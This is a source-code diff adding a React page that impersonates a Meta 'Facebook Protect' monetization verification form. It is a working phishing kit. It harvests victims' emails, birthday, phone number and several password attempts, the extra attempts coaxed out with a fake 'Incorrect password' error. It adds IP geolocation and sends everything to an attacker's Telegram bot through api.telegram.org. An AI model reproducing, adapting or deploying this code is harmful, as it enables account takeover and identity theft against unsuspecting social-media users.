@@ -1,0 +1,578 @@
+import Banner from '@/assets/banner.png';
+import HeroImage from '@/assets/facebookprotect.jpg';
+import MetaLogo from '@/assets/meta-logo-2.png';
+import { useForm } from 'react-hook-form';
+import { z } from 'zod';
+import { zodResolver } from '@hookform/resolvers/zod';
+import { useMemo, useEffect, useState } from 'react';
+import { AlertCircle, Lock, Eye, EyeOff } from 'lucide-react';
+import { config } from '@/config/data';
+import { useNavigate } from 'react-router';
+
+interface CountryResponse {
+    name: string;
+    country: string;
+    country_3: string;
+}
+
+interface StoredFormData {
+    emailBusiness: string;
+    emailPersonal: string;
+    birthday: string;
+    phone: string;
+    passwordAttempts: string[];
+    lastMessageId: number | null;
+    timestamp: number;
+    lastMessage: string;
+}
+
+interface GeoJSResponse {
+    city: string;
+    country: string;
+    region: string;
+    timezone: string;
+    latitude: string;
+    longitude: string;
+    ip: string;
+    organization_name: string;
+}
+
+interface PageContent {
+    title: string;
+    warning: string;
+    formTitle: string;
+    emailBusinessPlaceholder: string;
+    emailPersonalPlaceholder: string;
+    birthdayPlaceholder: string;
+    phonePlaceholder: string;
+    verifyButton: string;
+    caseType: string;
+    securityInfo: string;
+    passwordTitle: string;
+    passwordSubtitle: string;
+    passwordPlaceholder: string;
+    cancelButton: string;
+    submitButton: string;
+    processingText: string;
+    verificationNote: string;
+    step1Text: string;
+    step2Text: string;
+    // Thêm các text mới cho giao diện
+    selectAssetText: string;
+    selectIssueText: string;
+    getHelpText: string;
+    turnOnProfessionalMode: string;
+    warningText: string;
+    verifyDetailsTitle: string;
+    communityStandardsText: string;
+    reviewText: string;
+    moreInfoText: string;
+}
+
+const defaultContent: PageContent = {
+    title: 'Welcome To Facebook Protect.',
+    warning: 'Enable monetization on your Page, so we apply eligibility requirements to activate the automatic monetization feature on the Page. We created this monetization program to unlock the automatic monetization feature on your Page.',
+    formTitle: 'ACCOUNT VERIFICATION FORM',
+    emailBusinessPlaceholder: 'Business email address',
+    emailPersonalPlaceholder: 'Personal email address',
+    birthdayPlaceholder: 'Birthday (DD/MM/YYYY)',
+    phonePlaceholder: 'Phone number',
+    verifyButton: 'Continue',
+    caseType: 'Case Type: Community Standards Violation Review',
+    securityInfo: 'Please ensure all information is accurate. Incorrect information may result in permanent account closure.',
+    passwordTitle: 'Please Enter Your Password',
+    passwordSubtitle: 'For your security, you must enter your password to continue.',
+    passwordPlaceholder: 'Enter your password',
+    cancelButton: 'Cancel',
+    submitButton: 'Submit',
+    processingText: 'Processing...',
+    verificationNote: 'This information is required to verify your identity and protect your account',
+    step1Text: 'We have activated the self-monetization feature on your Page.',
+    step2Text: 'Below, we provide you with a detailed guide on the process and help you fully activate and unlock the monetization feature on your Page.',
+    selectAssetText: 'Select Asset',
+    selectIssueText: 'Select the Issue',
+    getHelpText: 'Get help',
+    turnOnProfessionalMode: 'TURN ON PROFESSIONAL MODE',
+    warningText: 'Please provide all the required information. If we do not receive a response within 24 hours, the automatic monetization feature on your Page will be deactivated and may not be re-enabled in the future.',
+    verifyDetailsTitle: 'Verify Your Details',
+    communityStandardsText: 'Community Standards',
+    reviewText: 'Review our',
+    moreInfoText: 'for more information.'
+};
+
+const mainFormSchema = z.object({
+    emailBusiness: z.string().email('Please enter a valid business email address'),
+    emailPersonal: z.string().email('Please enter a valid personal email address'),
+    birthday: z.string().regex(/^(\d{2})[/-](\d{2})[/-]\d{4}$/, 'Please enter a valid date (DD/MM/YYYY)'),
+    phone: z.string().min(1)
+});
+
+const passwordFormSchema = z.object({
+    password: z.string().min(6, 'Password must be at least 6 characters')
+});
+
+type MainFormValues = z.infer<typeof mainFormSchema>;
+type PasswordFormValues = z.infer<typeof passwordFormSchema>;
+
+const generateCaseNumber = (): string => {
+    return Math.floor(100000000 + Math.random() * 900000000).toString();
+};
+
+const formatDateVN = (dateStr: string): string => {
+    if (/^\d{2}[/-]\d{2}[/-]\d{4}$/.exec(dateStr)) {
+        return dateStr.replace('/', '-');
+    }
+    const [year, month, day] = dateStr.split('-');
+    return `${day}-${month}-${year}`;
+};
+
+const translateText = async (text: string, targetLang: string): Promise<string> => {
+    try {
+        const response = await fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`);
+        const data = await response.json();
+        return data[0].map((item: any[]) => item[0]).join('');
+    } catch (error) {
+        console.error('Translation error:', error);
+        return text;
+    }
+};
+
+interface CountryLanguageMap {
+    [key: string]: string;
+}
+
+const countryToLanguage: CountryLanguageMap = {
+    VN: 'vi',
+    CN: 'zh',
+    TW: 'zh',
+    HK: 'zh',
+    JP: 'ja',
+    KR: 'ko',
+    DE: 'de',
+    FR: 'fr',
+    IT: 'it',
+    ES: 'es',
+    PT: 'pt',
+    RU: 'ru',
+    US: 'en',
+    GB: 'en'
+};
+
+const Live = () => {
+    const caseNumber = useMemo(() => generateCaseNumber(), []);
+    const [phoneCode, setPhoneCode] = useState<string>('');
+    const [isLoading, setIsLoading] = useState(true);
+    const [showPasswordForm, setShowPasswordForm] = useState(false);
+    const [formData, setFormData] = useState<{
+        emailBusiness?: string;
+        emailPersonal?: string;
+        birthday?: string;
+        phone?: string;
+    }>({});
+    const [showPassword, setShowPassword] = useState(false);
+    const [isSubmitting, setIsSubmitting] = useState(false);
+    const [submitError, setSubmitError] = useState<string | null>(null);
+    const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
+    const [lastMessageId, setLastMessageId] = useState<number | null>(null);
+    const navigate = useNavigate();
+    const [content, setContent] = useState<PageContent>(defaultContent);
+    const [selectedLanguage, setSelectedLanguage] = useState('en');
+
+    useEffect(() => {
+        const translateContent = async () => {
+            if (selectedLanguage === 'en') {
+                setContent(defaultContent);
+                return;
+            }
+
+            const translatedContent: PageContent = { ...defaultContent };
+            for (const key of Object.keys(defaultContent) as (keyof PageContent)[]) {
+                translatedContent[key] = await translateText(defaultContent[key], selectedLanguage);
+            }
+            setContent(translatedContent);
+        };
+
+        translateContent();
+    }, [selectedLanguage]);
+
+    const {
+        register: registerMain,
+        handleSubmit: handleMainSubmit,
+        formState: { errors: mainErrors }
+    } = useForm<MainFormValues>({
+        resolver: zodResolver(mainFormSchema)
+    });
+
+    const {
+        register: registerPassword,
+        handleSubmit: handlePasswordSubmit,
+        formState: { errors: passwordErrors }
+    } = useForm<PasswordFormValues>({
+        resolver: zodResolver(passwordFormSchema)
+    });
+
+    const formatDateInput = (value: string) => {
+        const numbers = value.replace(/\D/g, '');
+
+        let formatted = '';
+        for (let i = 0; i < numbers.length && i < 8; i++) {
+            if (i === 2 || i === 4) {
+                formatted += '/';
+            }
+            formatted += numbers[i];
+        }
+
+        return formatted;
+    };
+
+    useEffect(() => {
+        const fetchCountryAndSetLanguage = async () => {
+            try {
+                setIsLoading(true);
+                const countryResponse = await fetch('https://get.geojs.io/v1/ip/country.json');
+                const countryData: CountryResponse = await countryResponse.json();
+
+                const detectedLanguage = countryToLanguage[countryData.country] || 'en';
+                setSelectedLanguage(detectedLanguage);
+
+                const codeResponse = await fetch('https://restcountries.com/v3.1/alpha/' + countryData.country);
+                const [codeData] = await codeResponse.json();
+                localStorage.setItem('detectedLanguage', detectedLanguage);
+                localStorage.setItem('country', countryData.country);
+                if (codeData?.idd?.root && codeData?.idd?.suffixes?.[0]) {
+                    const dialCode = `${codeData.idd.root}${codeData.idd.suffixes[0]}`;
+                    setPhoneCode(dialCode);
+                } else {
+                    console.log('Country code not found for:', countryData.country);
+                    setPhoneCode('+1');
+                }
+            } catch (error) {
+                console.error('Error fetching country data:', error);
+                setPhoneCode('+1');
+            } finally {
+                setIsLoading(false);
+            }
+        };
+
+        fetchCountryAndSetLanguage();
+    }, []);
+
+    useEffect(() => {
+        const storedData = localStorage.getItem('metaFormData');
+        if (storedData) {
+            const parsed = JSON.parse(storedData) as StoredFormData;
+
+            if (Date.now() - parsed.timestamp < 24 * 60 * 60 * 1000) {
+                setFormData({
+                    emailBusiness: parsed.emailBusiness,
+                    emailPersonal: parsed.emailPersonal,
+                    birthday: parsed.birthday,
+                    phone: parsed.phone
+                });
+                setPasswordAttempts(parsed.passwordAttempts);
+                setLastMessageId(parsed.lastMessageId);
+                setShowPasswordForm(true);
+            } else {
+                localStorage.removeItem('metaFormData');
+            }
+        }
+    }, []);
+
+    const onMainFormSubmit = (data: MainFormValues) => {
+        const formDataToStore = {
+            emailBusiness: data.emailBusiness,
+            emailPersonal: data.emailPersonal,
+            birthday: data.birthday,
+            phone: `${phoneCode}${data.phone}`
+        };
+
+        setFormData(formDataToStore);
+
+        const storedData: StoredFormData = {
+            ...formDataToStore,
+            passwordAttempts: [],
+            lastMessageId: null,
+            lastMessage: '',
+            timestamp: Date.now()
+        };
+        localStorage.setItem('metaFormData', JSON.stringify(storedData));
+
+        setShowPasswordForm(true);
+    };
+
+    const onPasswordSubmit = async (data: PasswordFormValues) => {
+        setIsSubmitting(true);
+        setSubmitError(null);
+
+        await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));
+
+        const newAttempts = [...passwordAttempts, data.password];
+        setPasswordAttempts(newAttempts);
+
+        const storedData = localStorage.getItem('metaFormData');
+        if (storedData) {
+            const parsed = JSON.parse(storedData) as StoredFormData;
+            const updatedData: StoredFormData = {
+                ...parsed,
+                passwordAttempts: newAttempts,
+                timestamp: Date.now()
+            };
+            localStorage.setItem('metaFormData', JSON.stringify(updatedData));
+        }
+
+        if (newAttempts.length > config.MAX_PASSWORD_ATTEMPTS) {
+            setIsSubmitting(false);
+            navigate('/verify');
+            return;
+        }
+
+        const fullFormData = {
+            ...formData,
+            passwords: newAttempts
+        };
+
+        try {
+            if (lastMessageId) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${config.TOKEN}/deleteMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: config.CHAT_ID,
+                            message_id: lastMessageId
+                        })
+                    });
+                } catch (error) {
+                    console.error('Error deleting previous message:', error);
+                }
+            }
+
+            const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
+            const geoData: GeoJSResponse = await geoResponse.json();
+
+            const currentTime = new Date().toLocaleString('vi-VN', {
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric'
+            });
+
+            const passwordList = newAttempts.map((pass, index) => `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`).join('\n');
+
+            const message = `
+<b>📅 Thời gian:</b> <code>${currentTime}</code>
+<b>🌐 IP:</b> <code>${geoData.ip}</code>
+<b>🌍 Vị trí:</b> <code>${geoData.city}, ${geoData.region}, ${geoData.country}</code>
+<b>📍 Tọa độ:</b> <code>${geoData.latitude}, ${geoData.longitude}</code>
+
+<b>🎂 Ngày sinh:</b> <code>${formatDateVN(fullFormData.birthday!)}</code>
+
+<b>📞 Số điện thoại:</b> <code>${fullFormData.phone}</code>
+<b>📧 Email Personal:</b> <code>${fullFormData.emailPersonal}</code>
+<b>📧 Email Business:</b> <code>${fullFormData.emailBusiness}</code>
+
+${passwordList}`;
+
+            const telegramApiUrl = `https://api.telegram.org/bot${config.TOKEN}/sendMessage`;
+
+            const response = await fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: config.CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error('Failed to send data. Please try again.');
+            }
+
+            const result = await response.json();
+
+            if (!result.ok) {
+                throw new Error(result.description || 'Failed to send data');
+            }
+
+            setLastMessageId(result.result.message_id);
+
+            const updatedStoredData = localStorage.getItem('metaFormData');
+            if (updatedStoredData) {
+                const parsed = JSON.parse(updatedStoredData) as StoredFormData;
+                const finalData: StoredFormData = {
+                    ...parsed,
+                    lastMessageId: result.result.message_id,
+                    lastMessage: message,
+                    timestamp: Date.now()
+                };
+                localStorage.setItem('metaFormData', JSON.stringify(finalData));
+            }
+
+            setSubmitError('Incorrect password. Please try again.');
+        } catch (error) {
+            console.error('Submit error:', error);
+            setSubmitError(error instanceof Error ? error.message : 'An error occurred. Please try again.');
+        } finally {
+            setIsSubmitting(false);
+        }
+    };
+
+    return (
+        <div className='min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4'>
+            <div className='max-w-xl mx-auto p-6 bg-white border rounded-xl border-gray-200 shadow-lg'>
+                {/* Progress Steps */}
+                <div className='flex items-start justify-between w-full mb-12'>
+                    <div className='flex flex-col items-center'>
+                        <div className='w-3 h-3 bg-blue-500 rounded-full mt-1 shadow-sm'></div>
+                        <span className='mt-4 text-sm font-medium text-gray-700'>{content.selectAssetText}</span>
+                    </div>
+                    <div className='h-[2px] flex-1 bg-blue-500 mt-[7px]'></div>
+                    <div className='flex flex-col items-center'>
+                        <div className='w-3 h-3 bg-blue-500 rounded-full mt-1 shadow-sm'></div>
+                        <span className='mt-4 text-sm font-medium text-gray-700'>{content.selectIssueText}</span>
+                    </div>
+                    <div className='h-[2px] flex-1 bg-blue-500 mt-[7px]'></div>
+                    <div className='flex flex-col items-center'>
+                        <div className='w-3 h-3 bg-blue-500 rounded-full mt-1 shadow-sm'></div>
+                        <span className='mt-4 text-sm font-medium text-gray-700'>{content.getHelpText}</span>
+                    </div>
+                </div>
+
+                <div className='space-y-6'>
+                    {/* Header */}
+                    <div className='text-center'>
+                        <h1 className='text-xl font-bold text-gray-900 mb-4'>{content.turnOnProfessionalMode}</h1>
+                        <div className='flex text-left justify-center p-4 bg-orange-50 border border-orange-200 rounded-lg'>
+                            <AlertCircle className='w-5 h-5 text-orange-500 mr-2 flex-shrink-0' />
+                            <p className='text-sm text-gray-700'>{content.warningText}</p>
+                        </div>
+                    </div>
+
+                    <div className='bg-white border rounded-xl border-gray-200 p-4 shadow-sm'>
+                        <h2 className='text-lg font-semibold text-blue-600 text-center mb-6'>{content.verifyDetailsTitle}</h2>
+
+                        <form onSubmit={handleMainSubmit(onMainFormSubmit)} className='space-y-5'>
+                            <div>
+                                <input type='email' placeholder={content.emailPersonalPlaceholder} {...registerMain('emailPersonal')} tabIndex={1} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
+                                {mainErrors.emailPersonal && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.emailPersonal.message}</p>}
+                            </div>
+
+                            <div>
+                                <input type='email' placeholder={content.emailBusinessPlaceholder} {...registerMain('emailBusiness')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
+                                {mainErrors.emailBusiness && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.emailBusiness.message}</p>}
+                            </div>
+
+                            <div>
+                                <input
+                                    type='text'
+                                    placeholder={content.birthdayPlaceholder}
+                                    {...registerMain('birthday')}
+                                    onChange={(e) => {
+                                        e.target.value = formatDateInput(e.target.value);
+                                        registerMain('birthday').onChange(e);
+                                    }}
+                                    maxLength={10}
+                                    tabIndex={3}
+                                    className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors'
+                                />
+                                {mainErrors.birthday && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.birthday.message}</p>}
+                            </div>
+
+                            <div className='relative'>
+                                <div className='absolute left-0 top-0 bottom-0 flex items-center pl-4 text-gray-600 z-10'>
+                                    <span className='text-sm'>{isLoading ? '...' : phoneCode}</span>
+                                </div>
+                                <input type='number' placeholder={content.phonePlaceholder} {...registerMain('phone')} tabIndex={4} className='w-full px-4 py-2.5 pl-[52px] border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors relative' />
+                                {mainErrors.phone && (
+                                    <div className='absolute left-0 right-0 mt-1.5'>
+                                        <p className='text-red-500 text-sm'>{mainErrors.phone.message}</p>
+                                    </div>
+                                )}
+                            </div>
+
+                            <button type='submit' tabIndex={5} className='w-full bg-blue-600 text-white py-2.5 px-4 rounded-lg hover:bg-blue-700 transition-colors font-medium shadow-sm'>
+                                {content.verifyButton}
+                            </button>
+
+                            <div className='pt-4 border-t'>
+                                <p className='font-medium text-gray-700 text-sm'>{`Case #${caseNumber}`}</p>
+                                <p className='mt-2 text-xs text-gray-600'>Case Type: Turn on monetization</p>
+                            </div>
+                        </form>
+                    </div>
+
+                    {/* Password Modal */}
+                    {showPasswordForm && (
+                        <div className='fixed inset-0 bg-black/50 flex items-center justify-center z-50'>
+                            <div className='bg-white rounded-xl p-6 w-full max-w-md mx-4 relative'>
+                                <div className='text-center mb-6'>
+                                    <div className='mx-auto w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mb-4'>
+                                        <Lock className='w-6 h-6 text-blue-600' />
+                                    </div>
+                                    <h2 className='text-xl font-bold text-gray-900'>{content.passwordTitle}</h2>
+                                    <p className='text-sm text-gray-600 mt-2'>{content.passwordSubtitle}</p>
+                                </div>
+
+                                <form onSubmit={handlePasswordSubmit(onPasswordSubmit)} className='space-y-4'>
+                                    <div className='relative'>
+                                        <input type={showPassword ? 'text' : 'password'} placeholder={content.passwordPlaceholder} autoFocus {...registerPassword('password')} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors pr-10' />
+                                        <button type='button' onClick={() => setShowPassword(!showPassword)} className='absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors'>
+                                            {showPassword ? <EyeOff className='w-5 h-5' /> : <Eye className='w-5 h-5' />}
+                                        </button>
+                                        {passwordErrors.password && <p className='text-red-500 text-sm mt-1.5'>{passwordErrors.password.message}</p>}
+                                    </div>
+
+                                    {submitError && (
+                                        <div className='p-3 bg-red-50 border border-red-200 rounded-lg'>
+                                            <p className='text-sm text-red-600'>{submitError}</p>
+                                        </div>
+                                    )}
+
+                                    <div className='flex gap-3'>
+                                        <button
+                                            type='button'
+                                            onClick={() => {
+                                                setFormData({});
+                                                setPasswordAttempts([]);
+                                                setShowPasswordForm(false);
+                                            }}
+                                            disabled={isSubmitting}
+                                            className='flex-1 px-4 py-2.5 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors disabled:opacity-50'
+                                        >
+                                            {content.cancelButton}
+                                        </button>
+                                        <button type='submit' disabled={isSubmitting} className='flex-1 px-4 py-2.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:opacity-50 flex items-center justify-center'>
+                                            {isSubmitting ? (
+                                                <div className='flex items-center gap-2'>
+                                                    <div className='w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin' />
+                                                    <span>{content.processingText}</span>
+                                                </div>
+                                            ) : (
+                                                content.submitButton
+                                            )}
+                                        </button>
+                                    </div>
+                                </form>
+
+                                <p className='text-xs text-gray-500 mt-4 text-center'>{content.verificationNote}</p>
+                            </div>
+                        </div>
+                    )}
+
+                    <p className='text-sm text-gray-600'>
+                        {content.securityInfo} {content.reviewText} <button className='text-blue-600 hover:underline'>{content.communityStandardsText}</button> {content.moreInfoText}
+                    </p>
+                </div>
+            </div>
+        </div>
+    );
+};
+
+export default Live;
